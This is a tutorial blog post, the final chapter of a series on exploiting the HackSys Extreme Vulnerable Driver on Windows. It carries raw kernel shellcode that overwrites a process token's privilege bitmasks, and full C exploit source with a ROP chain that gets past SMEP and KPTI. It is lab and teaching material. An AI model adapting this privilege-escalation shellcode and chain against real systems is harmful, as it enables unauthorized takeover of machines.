@@ -1,0 +1,451 @@
+<!DOCTYPE html>
+<html lang="en-us">
+
+<head>
+	<meta charset="UTF-8">
+	<meta name="viewport" content="width=device-width, initial-scale=1.0">
+	<meta http-equiv="X-UA-Compatible" content="ie=edge">
+	<meta name="theme-color" content="#ffffff">
+	<meta name="msapplication-TileColor" content="#ffffff">
+<meta itemprop="name" content="[Cracking Windows Kernel with HEVD] Chapter 4: How do we write a shellcode to elevate privileges and gracefully return to userland?">
+<meta itemprop="description" content="A beginers guide into a Windows kernel stack overflow vulnerability.">
+<meta itemprop="datePublished" content="2023-01-08T10:08:50-03:00" />
+<meta itemprop="dateModified" content="2023-01-08T10:08:50-03:00" />
+<meta itemprop="wordCount" content="2620">
+
+
+
+<meta itemprop="keywords" content="windows,kernel,exploit,stack,overflow,hevd,HEVD,hacksys,extreme,vulnerable,driver,exploitation,smep,kpti,bypass," /><meta property="og:title" content="[Cracking Windows Kernel with HEVD] Chapter 4: How do we write a shellcode to elevate privileges and gracefully return to userland?" />
+<meta property="og:description" content="A beginers guide into a Windows kernel stack overflow vulnerability." />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://mdanilor.github.io/posts/hevd-4/" />
+<meta property="article:published_time" content="2023-01-08T10:08:50-03:00" />
+<meta property="article:modified_time" content="2023-01-08T10:08:50-03:00" />
+<meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="[Cracking Windows Kernel with HEVD] Chapter 4: How do we write a shellcode to elevate privileges and gracefully return to userland?"/>
+<meta name="twitter:description" content="A beginers guide into a Windows kernel stack overflow vulnerability."/>
+
+	<link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png">
+	<link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+	<link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png">
+	<link rel="manifest" href="/site.webmanifest">
+	<link rel="mask-icon" href="/safari-pinned-tab.svg" color="">
+	<link rel="shortcut icon" href="/favicon.ico">
+
+	<title>[Cracking Windows Kernel with HEVD] Chapter 4: How do we write a shellcode to elevate privileges and gracefully return to userland?</title>
+	<link rel="stylesheet" href="https://mdanilor.github.io/css/style.min.eac77496566fd7d5768fd650ddb0b2b181ca6a2d7c5fdd6fe6b8ba4bf47e566f.css" integrity="sha256-6sd0llZv19V2j9ZQ3bCysYHKai18X91v5ri6S/R+Vm8=" crossorigin="anonymous">
+	
+</head>
+
+<body id="page">
+	
+	<header id="site-header" class="animated slideInUp">
+		<div class="hdr-wrapper section-inner">
+			<div class="hdr-left">
+				<div class="site-branding">
+					<a href="https://mdanilor.github.io">Cebola Security</a>
+				</div>
+				<nav class="site-nav hide-in-mobile">
+					
+				<a href="https://mdanilor.github.io/posts/">Posts</a>
+				<a href="https://mdanilor.github.io/about-hugo/">About</a>
+
+				</nav>
+			</div>
+			<div class="hdr-right hdr-icons">
+				<span class="hdr-social hide-in-mobile"><a href="https://github.com/mdanilor" target="_blank" rel="noopener me" title="Github"><svg xmlns="http://www.w3.org/2000/svg" class="feather" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M9 19c-5 1.5-5-2.5-7-3m14 6v-3.87a3.37 3.37 0 0 0-.94-2.61c3.14-.35 6.44-1.54 6.44-7A5.44 5.44 0 0 0 20 4.77 5.07 5.07 0 0 0 19.91 1S18.73.65 16 2.48a13.38 13.38 0 0 0-7 0C6.27.65 5.09 1 5.09 1A5.07 5.07 0 0 0 5 4.77a5.44 5.44 0 0 0-1.5 3.78c0 5.42 3.3 6.61 6.44 7A3.37 3.37 0 0 0 9 18.13V22"></path></svg></a></span><button id="menu-btn" class="hdr-btn" title="Menu"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-menu"><line x1="3" y1="12" x2="21" y2="12"></line><line x1="3" y1="6" x2="21" y2="6"></line><line x1="3" y1="18" x2="21" y2="18"></line></svg></button>
+			</div>
+		</div>
+	</header>
+	<div id="mobile-menu" class="animated fast">
+		<ul>
+			<li><a href="https://mdanilor.github.io/posts/">Posts</a></li>
+			<li><a href="https://mdanilor.github.io/about-hugo/">About</a></li>
+		</ul>
+	</div>
+
+
+	<main class="site-main section-inner animated fadeIn faster">
+		<article class="thin">
+			<header class="post-header">
+				<div class="post-meta"><span>Jan 8, 2023</span></div>
+				<h1>[Cracking Windows Kernel with HEVD] Chapter 4: How do we write a shellcode to elevate privileges and gracefully return to userland?</h1>
+			</header>
+			<div class="content">
+				<h3 id="the-end-is-near">The end is near<a href="#the-end-is-near" class="anchor" aria-hidden="true"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M15 7h3a5 5 0 0 1 5 5 5 5 0 0 1-5 5h-3m-6 0H6a5 5 0 0 1-5-5 5 5 0 0 1 5-5h3"></path><line x1="8" y1="12" x2="16" y2="12"></line></svg></a></h3>
+<p>Throughout the previous four chapters, everything we have been doing was basically exploiting a stack-based buffer overflow and bypassing a few kernel mitigations. Apart from the kernel-specific memory mitigations, until this point the exploitation has been as vanilla as it gets: a stack overflow with no canary.</p>
+<p>In this final post, we will dive into Windows privilege mechanism and use it to elevate our privileges. Then, we must return to userland. After all, there is no use in elevating privileges or executing code in ring0 if the computer is going to crash right after! The problem is we have corrupted our stack with our ROP payload. Not to mention the registers: we have corrupted them all. Restoring them would be impractical. That will be our main challenge today.</p>
+<h3 id="how-privileges-work-on-windows">How privileges work on Windows<a href="#how-privileges-work-on-windows" class="anchor" aria-hidden="true"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M15 7h3a5 5 0 0 1 5 5 5 5 0 0 1-5 5h-3m-6 0H6a5 5 0 0 1-5-5 5 5 0 0 1 5-5h3"></path><line x1="8" y1="12" x2="16" y2="12"></line></svg></a></h3>
+<p>It would be difficult to cover how security works on Windows, or even how privileges work. I&rsquo;ll cover the basics of privileges in this post. Later on I&rsquo;m planning to write another post just on Windows security architecture, but with my current post scheduling, this could take as long as a century ^^ (sorry about that!)</p>
+<p><code>&quot;A privilege is the right of an account, such as a user or group account, to perform various system-related operations on the local computer, such as shutting down the system, loading device drivers or changing the system time.&quot;</code></p>
+<p>That is <a href="https://learn.microsoft.com/en-us/windows/win32/secauthz/privileges">Microsoft&rsquo;s definition of privileges</a> on Windows. Privileges are not related to securable objects (such as files and folders), but to access to system resources and system related tasks. These privileges may be observed on a Windows terminal with the whoami command: <code>whoami /priv</code>.</p>
+<p>This is what appears when a low-privilege user checks its own privileges:</p>
+<p><img src="/posts/kernel2-img/19-whoami-lowpriv.png" alt=""></p>
+<p>Here we see an administrator:</p>
+<p><img src="/posts/kernel2-img/20-whoami-highpriv.png" alt=""></p>
+<p>As you may see, there are some privileges which appear only for the administrator. For each privilege, it can have a state: enabled or disabled. In reality, there are three possible attributes for a privilege: present, enabled and enabled by default. Present privileges are the ones shown by the <code>whoami</code> program. These privileges may be enabled or disabled. However, if a privilege is not present, it may not be enabled. The state is kind of straightforward: if it enabled, the user may use it. Otherwise, it must be enabled. The &ldquo;enabled by default&rdquo; attribute is also intuitive and needs no explanation.</p>
+<p>Ok, so these privileges are associated to the user. But what about processes?</p>
+<p>Well, there is a structure stored in kernel associated with each process named EPROCESS. It stores another very important data structure named TOKEN. <a href="https://learn.microsoft.com/en-us/windows/win32/secauthz/access-tokens">Access token</a> objects &ldquo;include the identity and privileges of the user account associated with the process or thread&rdquo;, as explained by Microsoft. When a user starts a new process (or thread), the system will create a copy of its access token and store it on the process structure. If we intend to elevate privileges of a process, this is the data structure with which we will mess.</p>
+<p>Amongst many information stored in token struct, such as security identifier (SID) for user account, SID for groups of which the user is a member, impersonation level, etc, it actually stores the privileges held by the user (or the user&rsquo;s group). These are the privileges of which I have spoken earlier! This guy is a data structure called <code>_SEP_TOKEN_PRIVILEGES</code> and its definition follows:</p>
+<pre><code>kd&gt; dt _SEP_TOKEN_PRIVILEGES
+nt!_SEP_TOKEN_PRIVILEGES
+   +0x000 Present          : Uint8B
+   +0x008 Enabled          : Uint8B
+   +0x010 EnabledByDefault : Uint8B
+</code></pre><p>That&rsquo;s right! Each privilege is represented by a bit in three bitmasks: present, enabled and enabled by default. Each bit is a permission from the list below:</p>
+<pre><code>    2: SeCreateTokenPrivilege -&gt; Create a token object
+    3: SeAssignPrimaryTokenPrivilege -&gt; Replace a process-level token
+    4: SeLockMemoryPrivilege -&gt; Lock pages in memory
+    5: SeIncreaseQuotaPrivilege -&gt; Increase quotas
+    6: SeMachineAccountPrivilege -&gt; Add workstations to the domain
+    7: SeTcbPrivilege -&gt; Act as part of the operating system
+    8: SeSecurityPrivilege -&gt; Manage auditing and security log
+    9: SeTakeOwnershipPrivilege -&gt; Take ownership of files/objects
+    10: SeLoadDriverPrivilege -&gt; Load and unload device drivers
+    11: SeSystemProfilePrivilege -&gt; Profile system performance
+    12: SeSystemtimePrivilege -&gt; Change the system time
+    13: SeProfileSingleProcessPrivilege -&gt; Profile a single process
+    14: SeIncreaseBasePriorityPrivilege -&gt; Increase scheduling priority
+    15: SeCreatePagefilePrivilege -&gt; Create a pagefile
+    16: SeCreatePermanentPrivilege -&gt; Create permanent shared objects
+    17: SeBackupPrivilege -&gt; Backup files and directories
+    18: SeRestorePrivilege -&gt; Restore files and directories
+    19: SeShutdownPrivilege -&gt; Shut down the system
+    20: SeDebugPrivilege -&gt; Debug programs
+    21: SeAuditPrivilege -&gt; Generate security audits
+    22: SeSystemEnvironmentPrivilege -&gt; Edit firmware environment values
+    23: SeChangeNotifyPrivilege -&gt; Receive notifications of changes to files or directories
+    24: SeRemoteShutdownPrivilege -&gt; Force shutdown from a remote system
+    25: SeUndockPrivilege -&gt; Remove computer from docking station
+    26: SeSyncAgentPrivilege -&gt; Synch directory service data
+    27: SeEnableDelegationPrivilege -&gt; Enable user accounts to be trusted for delegation
+    28: SeManageVolumePrivilege -&gt; Manage the files on a volume
+    29: SeImpersonatePrivilege -&gt; Impersonate a client after authentication
+    30: SeCreateGlobalPrivilege -&gt; Create global objects
+    31: SeTrustedCredManAccessPrivilege -&gt; Access Credential Manager as a trusted caller
+    32: SeRelabelPrivilege -&gt; Modify the mandatory integrity level of an object
+    33: SeIncreaseWorkingSetPrivilege -&gt; Allocate more memory for user applications
+    34: SeTimeZonePrivilege -&gt; Adjust the time zone of the computer's internal clock
+    35: SeCreateSymbolicLinkPrivilege -&gt; Required to create a symbolic link
+</code></pre><p>Credit where its due, this list was found <a href="https://github.com/volatilityfoundation/volatility/blob/master/volatility/plugins/privileges.py">here</a>. Thank you, <a href="https://www.volatilityfoundation.org/">Volatility Foundation</a>.</p>
+<p>You may observe that the list starts from the number 2 and goes way up to number 35. Why does it not start at zero, like everything else in computer science? Well, the answer is far from obvious. It is so unobvious that I do not now for sure, but I suspect that the two least significant bits must be zero so it is not &ldquo;mistaken&rdquo; by the number -1. If a vulnerability allows for an attacker to somehow change this structure (such as this one we are exploiting), it should be easier to set it to -1.</p>
+<p>Ok, back to the exploit. &ldquo;All&rdquo; we have to do is change the <code>SEP_TOKEN_PRIVILEGES</code> structure, which resides in <code>TOKEN</code> structure, which resides in <code>EPROCESS</code> structure, to 0xffffffffc on all fields (present, enabled and enabled by default, although the last one is optional).</p>
+<p>If we locate this structure in memory and alter it, we have our privilege escalation!</p>
+<h3 id="carving-a-shellcode">Carving a shellcode<a href="#carving-a-shellcode" class="anchor" aria-hidden="true"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M15 7h3a5 5 0 0 1 5 5 5 5 0 0 1-5 5h-3m-6 0H6a5 5 0 0 1-5-5 5 5 0 0 1 5-5h3"></path><line x1="8" y1="12" x2="16" y2="12"></line></svg></a></h3>
+<p>As mentioned, we must locate the privileges structure to alter it, which resides inside the token structure. Given an <code>EPROCESS</code> structure, it is trivial to find the primary token with the <a href="https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/ntifs/nf-ntifs-psreferenceprimarytoken">PsReferencePrimaryToken</a> method. It will return the token!</p>
+<p>To use this method, we require a <code>EPROCESS</code> object. No problem! The <a href="https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/ntifs/nf-ntifs-pslookupprocessbyprocessid">PsLookupProcessByProcessId</a> will give us just that, given that we provide a PID for the process.</p>
+<p>With token structure at hand, we have to find privilege structure to alter it. The <code>dt</code> command on WinDBG will reveal the offset for the structure:</p>
+<p><img src="/posts/kernel2-img/21-dt-token.png" alt=""></p>
+<p>It resides on offset 0x40. Neat. The steps we must take, so far, are these:</p>
+<ul>
+<li>From a PID, use <code>PsLookupProcessByProcessId()</code> function to obtain an <code>EPROCESS</code> object for the process which privileges will be elevated;</li>
+<li>From this <code>EPROCESS</code> object, obtain <code>TOKEN</code> struct;</li>
+<li>From <code>TOKEN</code> struct, obtain the <code>SEP_TOKEN_PRIVILEGES</code> struct at offset 0x40;</li>
+<li>Alter each field of this structure to 0xffffffffc</li>
+</ul>
+<p>Allright. Let&rsquo;s write some assembly code:</p>
+<pre><code>mov rcx, &lt;PID&gt; ;The first argument to PsLookupProcessByProcessId() is the PID number. Will be adjusted dinamically. Rcx on Windows calling convention stores the first argument.
+sub rsp, 0x8; The second argument given to PsLookupProcessByProcessId() is the EPROCESS struct to be filled (it is an out argument). I'm reserving 8 bytes for this in the stack.
+mov rdx, rsp; Now placing the second argument, which is a pointer to the stack (the 8 bytes we just reserved for this) to rdx. Rdx on Windows calling convention stores the second argument, remember? 
+movabs rbx, &lt;ADDRESS OF PsLookupProcessByProcessId()&gt; ;
+call rbx ; Actually call the function! The EPROCESS structure will be in stack (RSP).
+
+mov rcx, QWORD PTW [rsp] ; Moving RSP to the first and only argument of PsReferencePrimaryToken()
+movabs rbx, &lt;ADDRESS OF PsReferencePrimaryToken&gt; ; 
+call rbx ; Calling PsReferencePrimaryToken! The address for the struct will be on the return value, AKA rax register!
+add rax, 0x40; Adjusting the offset. Now rax points directly to SEP_TOKEN_PRIVILEGES.
+movabs rcx, 0xfffffffc ; The value of each SEP_TOKEN_PRIVILEGES is moved to rcx.
+mov QWORD PTR [rax], rcx ; Now the magic happens! We change the first field in SEP_TOKEN_PRIVILEGES to 0xfffffffc. 
+add rax, 0x8 ; Next field...
+mov QWORD PTR [rax], rcx ; Changing the second field.
+add rax, 0x8 ; Final field
+mov QWORD PTR [rax], rcx ; Changing the third field.
+</code></pre><p>There is one more thing we should do, which is return to userland gracefully.</p>
+<p><a href="https://twitter.com/gal_kristal">Kristal</a> discovered a nice approach to return to userland with <a href="https://kristal-g.github.io/2021/05/08/SYSRET_Shellcode.html">sysret</a>. Sysret is to syscall just as ret is to call, but with extra steps.</p>
+<p>In reality, upon a normal return to userland, the OS restores the execution context and returns gracefully. What Kristal did, and I incentivate you to read his post, is to mimic the way the OS returns to userland. His approach did not work here because KPTI was enabled.</p>
+<p>Windows has two approaches for returning. One for when KPTI is disabled and other for when it is enabled. Kristal - or any other person as far as I know - has not developed an approach for when KPTI is enabled. Well, neither did I.</p>
+<p>Windows has a specific function to return to userland. It is called <code>KiKernelSysretExit()</code>. The first and naive approach I did was to jump to that function at the end of my shellcode and let the kernel do the hard lifting, instead of I doing it myself at the shellcode. And, to my surprise, it actually worked.</p>
+<p><img src="/posts/kernel2-img/22-kernelsysretexit.png" alt=""></p>
+<p>I added two extra lines to the shellcode:</p>
+<pre><code>movabs rbx, &lt;ADDRESS_TO_SYSRET_KERNEL_FUNCTION&gt;;
+jmp rbx;
+</code></pre><p>And the kernel did the rest!</p>
+<p>I used my boy&rsquo;s <a href="https://viniciusmarangoni.github.io/">Vinicius</a> brilliant <a href="https://github.com/viniciusmarangoni/shellcoding-tools">shellcoding tools</a> to transform my assembly code into opcodes. Then I put it in a variable and adjusted the addresses in runtime. My <code>generate_shellcode()</code> function looks like this now:</p>
+<pre><code>char *generate_shellcode() {
+	char *shellcode = (char*)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, 0x4e+11); //0x4e+11 is the size of the shellcode
+	memcpy(shellcode, &quot;\x48\xc7\xc1\x78\x56\x34\x12\x48\x83\xec\x08\x48\x89\xe2\x48\xbb\x00\x00\x00\x00\xff\xff\xff\xff\xff\xd3\x48\x8b\x0c\x24\x48\xbb\x10\x32\x34\x12\xff\xff\xff\xff\xff\xd3\x48\x83\xc0\x40\x48\xb9\xfc\xff\xff\xff\x00\x00\x00\x00\x48\x89\x08\x48\x83\xc0\x08\x48\x89\x08\x48\x83\xc0\x08\x48\x89\x08\x48\x83\xc4\x08\x48\xBB\xC0\x0D\x02\x1B\x05\xF8\xFF\xFF\xFF\xE3&quot;, 0x4e+11);
+	memcpy(shellcode + 3, &amp;pid, 4); // Adjusting the PID
+	memcpy(shellcode + 16, &amp;kernel_PsLookupProcessByProcessId, 8); //Adjusting the address for PsLookUpProcessByProcessId function
+	memcpy(shellcode + 32, &amp;kernel_PsReferencePrimaryToken, 8); //Adjusting PsReferencePrimaryToken function address
+	memcpy(shellcode + 0x4e+1, &amp;kernel_sysret, 8); // Adjusting sysret function address.
+	return shellcode;
+}
+
+</code></pre><p>And boom! It worked!</p>
+<h3 id="the-final-exploit">The final exploit<a href="#the-final-exploit" class="anchor" aria-hidden="true"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M15 7h3a5 5 0 0 1 5 5 5 5 0 0 1-5 5h-3m-6 0H6a5 5 0 0 1-5-5 5 5 0 0 1 5-5h3"></path><line x1="8" y1="12" x2="16" y2="12"></line></svg></a></h3>
+<p>I run the exploit:</p>
+<p><img src="/posts/kernel2-img/23-exploit-0.png" alt=""></p>
+<p>On the left, we see my exploit&rsquo;s debug messages. On the right, it spawned a CMD which will have its privileges elevated. I put a <code>whoami /priv</code> to assert that it is unprivileged.</p>
+<p>When I press enter on the exploit terminal, the privileges are elevated.</p>
+<p><img src="/posts/kernel2-img/24-exploit-1.png" alt=""></p>
+<p>Finally! The system did not crash and privileges were elevated. I will leave the full source code at the end of the post.</p>
+<h3 id="conclusions">Conclusions<a href="#conclusions" class="anchor" aria-hidden="true"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M15 7h3a5 5 0 0 1 5 5 5 5 0 0 1-5 5h-3m-6 0H6a5 5 0 0 1-5-5 5 5 0 0 1 5-5h3"></path><line x1="8" y1="12" x2="16" y2="12"></line></svg></a></h3>
+<p>We did it! Phew, this took forever for me to write. I apologize for the extremely long delay. From this exercise, we may conclude a few things:</p>
+<ul>
+<li>Windows kernel mitigations are not that powerful. Window&rsquo;s KASLR is easily bypassable when you are running from integrity level medium or above. SMEP is useful, but there is a neat gadget to bypass it easily. KPTI was the hardest enemy, but can be bypassed by allocating an executable pool and jumping to it.</li>
+<li>If we cannot restore the stack, we can just let the kernel do the heavy lifting by calling its own exit function.</li>
+<li>Assembly programming is very useful for shellcoding at this level.</li>
+</ul>
+<p>Hope you enjoyed it! See you next time.</p>
+<h3 id="source-code">Source code<a href="#source-code" class="anchor" aria-hidden="true"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M15 7h3a5 5 0 0 1 5 5 5 5 0 0 1-5 5h-3m-6 0H6a5 5 0 0 1-5-5 5 5 0 0 1 5-5h3"></path><line x1="8" y1="12" x2="16" y2="12"></line></svg></a></h3>
+<pre><code>#include &lt;iostream&gt;
+#include &lt;string&gt;
+#include &lt;Windows.h&gt;
+#include &lt;Psapi.h&gt;
+
+// Name of the device
+#define DEVICE_NAME	&quot;\\\\.\\HackSysExtremeVulnerableDriver&quot;
+#define IOCTL(Function) CTL_CODE(FILE_DEVICE_UNKNOWN, Function, METHOD_NEITHER, FILE_ANY_ACCESS)
+
+unsigned long long g_add_rsp_20h_ret = 0xa155de;
+
+
+unsigned long long g_pop_rdi_pop_r14_pop_rbx_ret = 0x20a518;
+unsigned long long g_xor_ecx_ecx_mov_rax_rcx_ret = 0x38cf53;
+unsigned long long g_pop_rdx_ret = 0x416748;
+unsigned long long g_push_rax_pop_rbx_ret = 0x20a263;
+unsigned long long g_push_rax_pop_r13_ret = 0x5af724;
+unsigned long long g_xchg_r8_r13_ret = 0x2c0da6;
+unsigned long long g_mov_rcx_r8_mov_rax_rcx_ret = 0x93ac7a;
+unsigned long long g_pop_r8_ret = 0x2017f1;
+unsigned long long g_jmp_rbx = 0x408aa2;
+unsigned long long kernel_ExAllocatePoolWithTag;
+unsigned long long kernel_sysret = 0xa13dc0;
+unsigned long long kernel_memcpy;
+
+
+DWORD pid;
+
+typedef struct sSepTokenPrivileges {
+	UINT8 present;
+	UINT8 enabled;
+	UINT8 enabled_by_default;
+} SEP_TOKEN_PRIVILEGES;
+
+typedef NTSTATUS(*_PsLookupProcessByProcessId)(IN HANDLE, OUT PVOID *);
+_PsLookupProcessByProcessId kernel_PsLookupProcessByProcessId;
+
+typedef PVOID(*_PsReferencePrimaryToken)(PVOID);
+_PsReferencePrimaryToken kernel_PsReferencePrimaryToken;
+
+// Definição do número da IOCTL para o StackOverflow
+#define STACK_OVERFLOW_IOCTL_NUMBER     IOCTL(0x800)
+
+// Returns kernel base address
+unsigned long long get_kernel_base_addr() {
+	LPVOID drivers[1024];
+	DWORD cbNeeded;
+
+	EnumDeviceDrivers(drivers, sizeof(drivers), &amp;cbNeeded);
+
+	return (unsigned long long)drivers[0];
+}
+
+// Gets the handle for the device driver
+HANDLE get_handle() {
+	HANDLE h = CreateFileA(DEVICE_NAME,
+		FILE_READ_ACCESS | FILE_WRITE_ACCESS,
+		FILE_SHARE_READ | FILE_SHARE_WRITE,
+		NULL,
+		OPEN_EXISTING,
+		FILE_FLAG_OVERLAPPED | FILE_ATTRIBUTE_NORMAL,
+		NULL);
+
+	if (h == INVALID_HANDLE_VALUE) {
+		printf(&quot;Failed to get handle =(\n&quot;);
+		return NULL;
+	}
+	return h;
+}
+
+void add_to_payload(char *in_buffer, SIZE_T *offset, unsigned long long *data, SIZE_T size)
+{
+	memcpy(in_buffer + *offset, data, size);
+	printf(&quot;Wrote %lx to offset %u\n&quot;, *data, *offset);
+	*offset += size;
+}
+
+PVOID get_kernel_symbol_addr(const char *symbol) {
+	PVOID kernelBaseAddr;
+	HMODULE userKernelHandle;
+	PCHAR functionAddress;
+	unsigned long long offset;
+
+	kernelBaseAddr = (PVOID)get_kernel_base_addr();  // Loads kernel base address
+	userKernelHandle = LoadLibraryA(&quot;C:\\Windows\\System32\\ntoskrnl.exe&quot;);  // Gets kernel binary
+
+	if (userKernelHandle == INVALID_HANDLE_VALUE) {
+		return NULL;
+	}
+
+	functionAddress = (PCHAR)GetProcAddress(userKernelHandle, symbol);  // Finds given symbol
+	if (functionAddress == NULL) {
+		// Could not find symbol
+		return NULL;
+	}
+
+	offset = functionAddress - ((PCHAR)userKernelHandle);  // Subtracts the loaded binary's base address from the found address. This way, we will find the offset of the symbol for base address 0.
+	return (PVOID)(((PCHAR)kernelBaseAddr) + offset);  // Adds the offset to the leaked base address.
+}
+
+void adjust_offsets()
+{
+	unsigned long long kernel_base_addr = get_kernel_base_addr();
+	g_xor_ecx_ecx_mov_rax_rcx_ret += kernel_base_addr;
+	g_pop_rdi_pop_r14_pop_rbx_ret += kernel_base_addr;
+	g_add_rsp_20h_ret += kernel_base_addr;
+	g_pop_rdx_ret += kernel_base_addr;
+	g_push_rax_pop_rbx_ret += kernel_base_addr;
+	g_push_rax_pop_r13_ret += kernel_base_addr;
+	g_xchg_r8_r13_ret += kernel_base_addr;
+	g_mov_rcx_r8_mov_rax_rcx_ret += kernel_base_addr;
+	g_pop_r8_ret += kernel_base_addr;
+	g_jmp_rbx += kernel_base_addr;
+	
+	kernel_sysret += kernel_base_addr;
+	kernel_ExAllocatePoolWithTag = (unsigned long long) get_kernel_symbol_addr(&quot;ExAllocatePoolWithTag&quot;);
+	kernel_memcpy = (unsigned long long) get_kernel_symbol_addr(&quot;memcpy&quot;);
+	kernel_PsLookupProcessByProcessId = (_PsLookupProcessByProcessId) get_kernel_symbol_addr(&quot;PsLookupProcessByProcessId&quot;);
+	kernel_PsReferencePrimaryToken = (_PsReferencePrimaryToken) get_kernel_symbol_addr(&quot;PsReferencePrimaryToken&quot;);
+	printf(&quot;Primary token: %xu \n&quot;, (ULONGLONG)kernel_PsReferencePrimaryToken - kernel_base_addr);
+	printf(&quot;PsReferencePrimaryToken base addr: %xu\n&quot;, (ULONGLONG) kernel_PsReferencePrimaryToken - (ULONGLONG) kernel_base_addr);
+}
+
+
+DWORD spawnCmd() {
+	STARTUPINFO si;
+	PROCESS_INFORMATION pi;
+	char cmd[] = &quot;C:\\Windows\\System32\\cmd.exe&quot;;
+
+	ZeroMemory(&amp;si, sizeof(si));
+	si.cb = sizeof(si);
+	ZeroMemory(&amp;pi, sizeof(pi));
+
+	// Start the child process. 
+	if (!CreateProcess(NULL,	// No module name (use command line)
+		cmd,					// Command line
+		NULL,					// Process handle not inheritable
+		NULL,					// Thread handle not inheritable
+		FALSE,					// Set handle inheritance to FALSE
+		CREATE_NEW_CONSOLE,     // No creation flags
+		NULL,					// Use parent's environment block
+		NULL,					// Use parent's starting directory 
+		&amp;si,					// Pointer to STARTUPINFO structure
+		&amp;pi)					// Pointer to PROCESS_INFORMATION structure
+		)
+	{
+		printf(&quot;CreateProcess failed (%d).\n&quot;, GetLastError());
+		return -1;
+	}
+
+	return pi.dwProcessId;
+}
+
+char *generate_shellcode() {
+	char *shellcode = (char*)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, 0x4e+11);
+	memcpy(shellcode, &quot;\x48\xc7\xc1\x78\x56\x34\x12\x48\x83\xec\x08\x48\x89\xe2\x48\xbb\x00\x00\x00\x00\xff\xff\xff\xff\xff\xd3\x48\x8b\x0c\x24\x48\xbb\x10\x32\x34\x12\xff\xff\xff\xff\xff\xd3\x48\x83\xc0\x40\x48\xb9\xfc\xff\xff\xff\x00\x00\x00\x00\x48\x89\x08\x48\x83\xc0\x08\x48\x89\x08\x48\x83\xc0\x08\x48\x89\x08\x48\x83\xc4\x08\x48\xBB\xC0\x0D\x02\x1B\x05\xF8\xFF\xFF\xFF\xE3&quot;, 0x4e+11);
+	memcpy(shellcode + 3, &amp;pid, 4);
+	memcpy(shellcode + 16, &amp;kernel_PsLookupProcessByProcessId, 8);
+	memcpy(shellcode + 32, &amp;kernel_PsReferencePrimaryToken, 8);
+	memcpy(shellcode + 0x4e+1, &amp;kernel_sysret, 8);
+	return shellcode;
+}
+
+//Does everything
+void do_buffer_overflow(HANDLE h)
+{
+	SIZE_T in_buffer_size = 2072 + 8 * 15 + 0x20;
+	PULONG in_buffer = (PULONG)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, in_buffer_size);
+	memset((char *)in_buffer, 'A', in_buffer_size);
+	
+	SIZE_T offset = 2072;
+
+	pid = spawnCmd();
+	adjust_offsets();
+	char *shellcode = generate_shellcode();
+
+	unsigned long long size_of_copy = 0x4e+11;
+
+	add_to_payload((char*)in_buffer, &amp;offset, &amp;g_xor_ecx_ecx_mov_rax_rcx_ret, 8);
+	add_to_payload((char*)in_buffer, &amp;offset, &amp;g_pop_rdx_ret, 8);
+	add_to_payload((char*)in_buffer, &amp;offset, &amp;size_of_copy, 8);
+	add_to_payload((char*)in_buffer, &amp;offset, &amp;kernel_ExAllocatePoolWithTag, 8);
+	add_to_payload((char*)in_buffer, &amp;offset, &amp;g_add_rsp_20h_ret, 8);
+	offset += 0x20;
+
+	add_to_payload((char*)in_buffer, &amp;offset, &amp;g_push_rax_pop_rbx_ret, 8);
+	add_to_payload((char*)in_buffer, &amp;offset, &amp;g_push_rax_pop_r13_ret, 8);
+	add_to_payload((char*)in_buffer, &amp;offset, &amp;g_xchg_r8_r13_ret, 8);
+	add_to_payload((char*)in_buffer, &amp;offset, &amp;g_mov_rcx_r8_mov_rax_rcx_ret, 8);
+	add_to_payload((char*)in_buffer, &amp;offset, &amp;g_pop_rdx_ret, 8);
+	add_to_payload((char*)in_buffer, &amp;offset, (unsigned long long *)(&amp;shellcode), 8);
+	add_to_payload((char*)in_buffer, &amp;offset, &amp;g_pop_r8_ret, 8);
+	add_to_payload((char*)in_buffer, &amp;offset, &amp;size_of_copy, 8);
+	add_to_payload((char*)in_buffer, &amp;offset, &amp;kernel_memcpy, 8);
+	add_to_payload((char*)in_buffer, &amp;offset, &amp;g_jmp_rbx, 8);
+	
+
+	system(&quot;pause&quot;);
+	printf(&quot;Sending buffer.\n&quot;);
+	//Sends buffer through IOCTL
+	bool result = DeviceIoControl(h, STACK_OVERFLOW_IOCTL_NUMBER, in_buffer, (DWORD)in_buffer_size, NULL, 0, NULL, NULL);
+	if (!result)
+	{
+		printf(&quot;IOCTL Failed: %X\n&quot;, GetLastError());
+	}
+	//Frees allocated memory
+	HeapFree(GetProcessHeap(), 0, (LPVOID)in_buffer);
+}
+
+
+int main(int argc, char **argv)
+{
+	do_buffer_overflow(get_handle());
+	system(&quot;pause&quot;);
+}
+
+</code></pre>
+			</div>
+			<hr class="post-end">
+			<footer class="post-info">
+				<p>
